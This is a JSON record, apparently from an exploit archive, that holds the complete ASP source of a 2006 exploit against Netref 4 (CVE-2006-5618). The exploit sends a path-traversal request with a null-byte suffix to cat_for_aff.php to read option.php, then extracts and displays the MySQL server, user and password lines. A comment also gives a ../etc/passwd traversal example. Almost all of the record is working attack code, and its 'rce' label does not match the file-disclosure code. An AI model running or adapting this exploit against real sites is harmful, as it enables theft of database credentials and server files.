{
  "id": "2677",
  "title": "Netref 4 - &#039;cat_for_aff.php&#039; Source Code Disclosure",
  "cve": "CVE-2006-5618",
  "vuln_type": "rce",
  "code": "<% Response.Buffer = True %>\r\n<% On Error Resume Next %>\r\n<% Server.ScriptTimeout = 100 %>\r\n\r\n<%\r\n'===============================================================================================\r\n'                          =>option.php Reader\r\n'[Script Name: Netref 4 (cat_for_aff.php) Source Code Disclosure\r\n'[Coded by   : ajann\r\n'[Author   : ajann\r\n'[Contact    : :(\r\n'[ExploitName: exploit4.asp\r\n\r\n'[Note : exploit file name =>exploit4.asp\r\n'[Note : http://[target]/[path]/script/cat_for_aff.php?ad_direct=../etc/passwd    |etc...\r\n'[Using : Write Target after Submit Click\r\n'===============================================================================================\r\n\r\n%>\r\n\r\n<%\r\nfunction guvenlik(username)\r\nguvenlik = Replace(username,\" // Adresse du serveur MySQL\",\"\")\r\nguvenlik = Replace(guvenlik,\" // Nom d'utilisateur de la base MySQL \",\"\")\r\nguvenlik = Replace(guvenlik,\" // Nom d'utilisateur MySQL\",\"\")\r\nguvenlik = Replace(guvenlik,\" //Mot de passe MySQL\",\"\")\r\nguvenlik = Replace(guvenlik,\" // Nom de la base MySQL\",\"\")\r\nguvenlik = Replace(guvenlik,\" // Nom d'utilisateur de la base\",\"\")\r\nguvenlik = Replace(guvenlik,\" MySQL\",\"\")\r\nEnd Function\r\n%>\r\n\r\n<html>\r\n<title>Netref 4 (cat_for_aff.php) Source Code Disclosure</title>\r\n<head>\r\n\r\n<script language=\"JavaScript\">    \r\n  function functionControl1(){  \r\n        setTimeout(\"functionControl2()\",2000);    \r\n     }  \r\n  \r\n  function functionControl2(){  \r\n            if(document.form1.field1.value==\"\"){  \r\n \r\n     alert(\"[Exploit Failed]=>The Username and Password Didnt Take,Try Again\");\r\n        \r\n                             }  \r\n                        }\r\n\r\n  function writetext() {\r\n\r\n            if(document.form1.field1.value==\"\"){\r\ndocument.getElementById('htmlAlani').innerHTML='<font face=\\\"Verdana\\\" size=\\\"1\\\" color=\\\"#008000\\\">There is a problem... The Data Didn\\'t Take </font>'\r\n\r\n                            }\r\n                 }\r\n  function write(){  \r\n        setTimeout(\"writetext()\",1000);    \r\n     }  \r\n  \r\n</script>\r\n\r\n\r\n</head>\r\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=windows-1254\">\r\n<body bgcolor=\"#000000\" link=\"#008000\" vlink=\"#008000\" alink=\"#008000\">\r\n\r\n<center>\r\n<font face=\"Verdana\" size=\"2\" color=\"#008000\"><b><a href=\"exploit4.asp\">Netref </b>v4 (cat_for_aff.php) <u><b>\r\nSource Code Disclosure</b></u></a></font><br><br>\r\n<table border=\"1\" cellpadding=\"0\" cellspacing=\"0\" style=\"border-collapse: collapse\" width=\"35%\" id=\"AutoNumber1\" bordercolorlight=\"#808080\" bordercolordark=\"#008000\" bordercolor=\"#808080\">\r\n  <tr>\r\n    <td width=\"50%\" bgcolor=\"#808000\" onmouseover=\"javascript:this.style.background='#808080';\" onmouseout=\"javascript:this.style.background='#808000';\">\r\n    <font face=\"Arial\" size=\"1\"><b><font color=\"#FFFFFF\">TARGET:</font>Example:[http://x.com/path]</b></font><p>\r\n    </td>\r\n    <td width=\"50%\"><center>\r\n<form method=\"post\" name=\"form1\" action=\"exploit4.asp?islem=get\">\r\n<input type=\"text\" name=\"text1\" value=\"http://\" size=\"25\" style=\"background-color: #808080\">\r\n<input type=\"submit\" value=\"Get\"></center></td>\r\n  </tr>\r\n\r\n</table>\r\n\r\n<div id=htmlAlani></div>\r\n\r\n<%\r\nislem = Request.QueryString(\"islem\")    \r\nIf islem = \"hata1\" Then \r\nResponse.Write \"<font face=\"\"Verdana\"\" size=\"\"1\"\" color=\"\"#008000\"\">There is a problem! Please complete to the whole spaces</font>\"\r\nEnd If\r\nIf islem = \"hata2\" Then \r\nResponse.Write \"<font face=\"\"Verdana\"\" size=\"\"1\"\" color=\"\"#008000\"\">There is a problem! Please right character use</font>\"\r\nEnd If\r\nIf islem = \"hata3\" Then \r\nResponse.Write \"<font face=\"\"Verdana\"\" size=\"\"1\"\" color=\"\"#008000\"\">There is a problem! Add \"\"http://\"\"</font>\"\r\nEnd If\r\n%>\r\n\r\n<%  \r\n\r\nIf islem = \"get\" Then\r\n\r\nstring1=\"/script\"\r\nstring2=\"/cat_for_aff.php?\"\r\nstring3=\"ad_direct=.\"\r\nstring4=\"./option\"\r\nstring5=\".php%0\"\r\nstring6=\"0\"\r\n\r\ntargettext = Request.Form(\"text1\")\r\narama=InStr(1, targettext, \"union\" ,1)\r\narama2=InStr(1, targettext, \"http://\" ,1)\r\n\r\nIf targettext=\"\" Then\r\nResponse.Redirect(\"exploit4.asp?islem=hata1\")\r\n\r\nElse\r\nIf arama>0 then \r\nResponse.Redirect(\"exploit4.asp?islem=hata2\")\r\n\r\nElse\r\nIf arama2=0 then \r\nResponse.Redirect(\"exploit4.asp?islem=hata3\")\r\n\r\nElse\r\n%> \r\n\r\n<%\r\n\r\ntarget1 = targettext+string1+string2+string3+string4+string5+string6\r\n\r\nPublic Function take(come)\r\nSet objtake = Server.CreateObject(\"Microsoft.XMLHTTP\" )\r\nWith objtake\r\n  .Open \"GET\" , come, FALSE\r\n  .sEnd\r\ntake =  .Responsetext\r\nEnd With\r\nSET objtake = Nothing\r\nEnd Function\r\n\r\nget_username = take(target1)\r\n\r\ngetdata=InStr(get_username,\"<?\" )\r\nusername=Mid(get_username,getdata+3,180)\r\n\r\n\r\n%>\r\n\r\n\r\n<center>\r\n<font face=\"Verdana\" size=\"2\" color=\"#008000\"> <u><b>\r\najann<br></b></u></font>\r\n<table border=\"1\" cellpadding=\"0\" cellspacing=\"0\" style=\"border-collapse: collapse\" width=\"35%\" id=\"AutoNumber1\" bordercolorlight=\"#808080\" bordercolordark=\"#008000\" bordercolor=\"#808080\">\r\n  <tr>\r\n    <td width=\"50%\" bgcolor=\"#808000\" onmouseover=\"javascript:this.style.background='#808080';\" onmouseout=\"javascript:this.style.background='#808000';\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n    <b><font size=\"2\" face=\"Arial\">Data:</font></b></td>\r\n    <td width=\"80%\">\r\n&nbsp;<b><font color=\"#C0C0C0\" size=\"2\" face=\"Verdana\"><%=guvenlik(username)%></b></font></p>\r\n </td>\r\n  </tr>\r\n  \r\n</table>\r\n\r\n<form method=\"POST\" name=\"form2\" action=\"#\">    \r\n<input type=\"hidden\" name=\"field1\" size=\"20\" value=\"<%=username%>\"></p>      \r\n</form> \r\n\r\n</center>\r\n\r\n<script language=\"JavaScript\">\r\nwrite()\r\nfunctionControl1()\r\n</script>\r\n\r\n</body>\r\n</html>\r\n\r\n<%\r\nEnd If\r\nEnd If\r\nEnd If\r\nEnd If\r\nSet objtake = Nothing \r\n%>\r\n\r\n# milw0rm.com [2006-10-29]",
  "url": "https://www.exploit-db.com/exploits/2677"
}